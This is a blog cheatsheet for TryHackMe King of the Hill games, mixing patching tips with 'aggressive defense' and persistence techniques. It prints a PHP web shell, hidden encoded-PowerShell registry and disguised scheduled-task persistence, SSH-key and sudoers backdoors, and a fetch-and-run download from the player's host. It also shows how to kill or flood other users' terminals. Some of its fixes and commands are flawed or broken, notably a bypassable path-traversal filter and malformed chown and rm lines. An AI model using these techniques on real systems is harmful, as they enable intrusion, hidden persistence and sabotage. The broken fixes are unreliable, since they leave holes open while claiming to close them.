---
layout: post
title: The Ultimate KOTH Defense Guide
summary: This cheatsheet features techniques and in-depth explanations on how to correctly defend the king's title and protect yourself in a TryHackMe King of the Hill game. This was made in collaboration with my friend xCthulhu from my CTF team. Huge thanks to him! He also has a website featuring excellent writeups and cheatsheets you might not want to miss!
date: 2020-08-08
categories: cheatsheets
author: Noxtal & xCthulhu
thumbnail: defense
tags:
- tryhackme
- koth
- defense
- patching
- aggressive defense
- persistence
- web
- aliases
- port migration
---

This cheatsheet features techniques and in-depth explanations on how to correctly defend the king's title and protect yourself in a TryHackMe King of the Hill game. This was made in collaboration with my friend [xCthulhu](https://onoma.cf/) from my [CTF team](https://discord.gg/CDACNFg). Huge thanks to him! He also has a website featuring excellent writeups and cheatsheets you might not want to miss! [Here](https://onoma.cf/) is the link.

-----

- [Common Web Patching](#common-web-patching)
  - [PHP LFI](#php-lfi)
  - [PHP Insecure File Upload](#php-insecure-file-upload)
  - [RCE](#rce)
    - [PHP Arbitrary Code Execution](#php-arbitrary-code-execution)
    - [Outdated Software CVE](#outdated-software-cve)
- [PrivEsc Patching](#privesc-patching)
  - [SUID Binaries](#suid-binaries)
    - [Discovery](#discovery)
    - [SUID Patch](#suid-patch)
    - [SGID Patch](#sgid-patch)
  - [NOPASSWD](#nopasswd)
    - [Remove user from sudoers](#remove-user-from-sudoers)
  - [Vulnerable Program](#vulnerable-program)
- [Aggressive Defense](#aggressive-defense)
  - [pts killing and breaking](#pts-killing-and-breaking)
  - [Terminal NyanCat](#terminal-nyancat)
    - [How is it important?](#how-is-it-important)
    - [But wait!](#but-wait)
  - [chattr (used for the king.txt file)](#chattr-used-for-the-kingtxt-file)
- [Port Migration](#port-migration)
    - [Config](#config)
- [Persistence](#persistence)
    - [Why is it important to have a persistence?](#why-is-it-important-to-have-a-persistence)
    - [Persistence Implant](#persistence-implant)
  - [Windows](#windows)
    - [Registry Persistence](#registry-persistence)
  - [Linux](#linux)
    - [SSH Key](#ssh-key)
    - [PHP Command Execution](#php-command-execution)
    - [Sudoers](#sudoers)
  - [Persistence Trigger](#persistence-trigger)
    - [Windows](#windows-1)
      - [Schedule tasks Persistence](#schedule-tasks-persistence)
    - [Linux](#linux-1)
      - [Cronjob](#cronjob)

# Common Web Patching
## PHP LFI
Basic `../` filter using `str_replace`:
1. Find the line with the inclusion by searching for the `includes` function in the code.
2. Replace the `$_GET['VARIABLE']` statement with the code below to get rid of `../`, disabling path traversal.
   
```php
str_replace("../","",$_GET['VARIABLE'])
```

## PHP Insecure File Upload
Upload files to a custom directory:
1. In the web directory, create your custom upload directory using `mkdir`. Name it something that should not be found by busters (ex.: gobuster). Your username is very likely not to be detected by those, it could be a good naming option.
2. Search in the source for the function that moves input files to a target directory.
3. Replace the target file path as shown below (using `move_uploaded_file` as an example).
   
```php
move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], "/YOUR_DIRECTORY/" . $_FILES["fileToUpload"]["name"])
```

Change filename to something unpredictable:
1. Search in the source for the function that moves input files to a target directory.
2. Replace the target file path as shown below (using `move_uploaded_file` as an example).
   
```php
move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], "/uploads/" . uniqid() . pathinfo($_FILES["fileToUpload"]["name"],PATHINFO_EXTENSION))
```

## RCE
### PHP Arbitrary Code Execution
Be certain to remove or replace as much `eval(...)` and `assert(...)` function calls as possible the server-side PHP code, as they can lead to arbitrary code execution.

### Outdated Software CVE
Some frameworks can have a RCE CVE. The *lion* KOTH box is a good example of this, implying a Nostromo RCE CVE on port 8080. You might want to check [my writeup](https://noxtal.com/writeups/2020/07/11/tryhackme-koth-lion/) on that box for more information.

The ideal way to patch that would be to update the outdated software. This can be hard to achieve in TryHackMe King of the Hill since all boxes have no Internet access. With that said, another conceivable solution exists. It consists of replacing the target software with something equivalent. For instance, you could use an updated version of Python's *http.server* module to replace an outdated version of Nostromo (as mentioned in my writeup). 

# PrivEsc Patching
## SUID Binaries
SUID (Set User ID) is a type of permission that is given to a file and allows users to execute the file with the permission of its owner. However, some of the existing binaries can be used to escalate privileges to root if they have the SUID permission.

```
-r-sr-sr-x
```

- The first 's' stands for the SUID.
- The second 's' stands for the SGID.
– When a command or script with SUID bit set is run, its effective UID becomes that of the owner of the file, rather than of the user who is running it.

### Discovery

Find SUID privescs using the following commands:
```bash
find / -perm -u=s -type f 2>/dev/null
```

Find SGID privescs using the following commands:
```bash
find / -perm -g=s -type f 2>/dev/null
```

### SUID Patch
This removes the SUID bit in a file or binary.
```
chmod u-s file_name
```

### SGID Patch
This removes the SGID bit in a file or binary.
```
chmod g-s file_name
```

## NOPASSWD
Whenever a program can be run as **root**(*sudo*) without a password, it has an extremely high chance to become a privesc. You can check for those using `sudo -l`

1. Open the /etc/sudoers file.
2. Look for the line containing the name of the user allowed to run the privesc.
3. Remove the part from the line starting with the following: `NOPASSWD:`

### Remove user from sudoers
If a user seems to have too much *sudo* permissions, you can delete it completely from the sudoers file using the method below.

1. Open the /etc/sudoers file.
2. Delete the line containing the name of the user you want to remove permissions from.

## Vulnerable Program
To patch a program with wrong permissions or being dangerous, reset its permissions, make root be the only one to own it and move the program to `/usr/sbin`. This directory is made for the most potentially dangerous programs that users shouldn't be allowed to use.

```bash
chmod 000 /path/to/program && chown -u root && mv file /usr/sbin
```

# Aggressive Defense
**DISCLAIMER**
> Do not use the following techniques unless they are permitted AND needed. These can quickly make a KOTH game become unfair, use them with prudence.

## pts killing and breaking
Find your `pts` number:
```bash
who # Find your IP in the list to find your pts
# OR
tty
# OR
ps aux | grep $$ # Then, look at the pts number from the result.
```

Find enemy `pts`:
```bash
who # Lists by ip

ps aux | grep pts # Lists by processes
# Then, look for a pts that is not yours
# (check your pts number first)
```

Kill a shell (`pts`):
```bash
# Choose a PID ($PID) belonging to your target's pts (found using the previous 'ps -aux' method)

kill -9 $PID

# To check if the pts have been killed, reuse the find command (ps aux | grep pts)
# If this pts can still be seen on the list, try killing every other PIDs using this methodology
```

Break a shell (`pts`) using `urandom`:
```bash
# Find a target pts number ($PTS), then run the following command
cat /dev/urandom > /dev/pts/$PTS
```

## Terminal NyanCat 
![NyanCat](https://camo.githubusercontent.com/dcf9c2c224d06a7be6dc2b69e993e9f0a252952c/687474703a2f2f6e79616e6361742e64616b6b6f2e75732f6e79616e6361742e706e67)  

### How is it important?  
It is very important to **HAVE FUN** during the game unless you are a competitive player.
It is important to showcase your nyancat to every player you are playing with. But how? 
Here are the simple steps:  

```bash
git clone https://github.com/klange/nyancat.git && cd nyancat # Clone the files from the git repository
make && cd src # Build the application
./nyancat # Run the binary and enjoy!
```

### But wait! 
That's unfair. You are the only one who enjoys the nyancat! 
Transfer the binary to the machine and show it to your fellow players by doing the steps below. 

```bash
sudo python3 -m http.server 80 # Initiate a web server
wget http://yourip/nyancat # On the KOTH machine, wget the file from your machine
chmod +x nyancat # Make it an executable
./nyancat | wall # Show it to your fellow players!
```

## chattr (used for the king.txt file)
Use `chattr` to set the immutability bit on the king.txt file and make it unwritable until another player does the inverse. You can also remove `chattr` from the system to make sure no one removes this protection.

Add the immutability bit:
```bash
chattr +i /root/king.txt
```

Remove the immutability bit:
```bash
chattr -i /root/king.txt
```

Remove chattr:
```bash
which chattr # Get chattr's path, default: /usr/bin/chattr

rm usr/bin/chattr # Or another path if different
```

# Port Migration
Since disabling services is illegal in a KOTH (King of the Hill) game, what we can do is to move the services into a different port. This way, we do not kill a certain service but we patched it by migrating it into a different port.

The best example is an SSH Service running on port 22. We can move it to any port that you only know to minimize SSH Bruteforce attacks and other players that have ssh credentials.

By editing the ssh config file, and setting the port to your desired port.
### Config
```
# old config
Port 22

# new config
Port 1337
```
Change 1337 to any port that you desire then restart the ssh service.

# Persistence
A lot of time and effort is spent just for gaining initial access to a machine, thus you must maintain access to your target. This is why persistence is the key component of how to do it.

### Why is it important to have a persistence?

Once you have established your persistence in your target system, you will have continual access to the system. This is vital since we do not know when we will be going to be kicked in the machine, power loss, network problems, and machine reboots.

In doing persistence, there are two components that you should always remember. 

1. Implant
2. Trigger

### Persistence Implant
Persistence implant is the payload or file that is going to be implanted into the target machine. It can be a binary, an executable file (EXE), a Dynamic Link Library (DLL), or some reverse shell commands embedded in some services.

More advanced techniques involve malwares, trojans, and rootkits.

## Windows

### Registry Persistence
```posh
function Registry-Persistence {
  [CmdletBinding()]
  Param{}
  try {
    $query = '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -c "$a=(Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run).DisableHelpStickerData;powershell -w hidden -enc $a"' 
    if ( -not (Test-RegEntry $RegKey $RegName) -and not (Test-RegEntry $RegKey $RegNameData))
    {
      Write-Host "Making the Persistence"
      New-ItemProperty $RegKey -Name $RegName -Value $query | Out-Null
      New-ItemProperty $RegKey -Name $RegNameData -Value $Payload | Out-Null
      Write-Host "Persistence Done!"
    }

    else { Write-Host "Persistence already exists!" }
  }
  catch { Write-Host "Try again."}
}
```

## Linux

### SSH Key
```bash
echo "my_id_rsa.pub" > /target machine/root/.ssh/authorized_keys
```

### PHP Command Execution
```php
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```

### Sudoers
```
<YOUR_USERNAME>        ALL=(ALL)        NOPASSWD: ALL
```
## Persistence Trigger
Persistence trigger is what will make our payload execute. We can either use cronjobs, services, registry, or scheduled tasks.

### Windows

#### Schedule tasks Persistence
```posh
PS C:\ ScheduledTask-Persistence - Time 13:45 -TaskName JavaUpdate -Payload "powershell.exe -exec bypass -nop -w hidden -File 'c:\windows\temp\grouppolicy.ps1'"
```

### Linux

#### Cronjob
```bash
CT=$(crontab -l)
CT=$CT$'\n10 * * * * yourcommandhere'
printf "$CT" | crontab -
```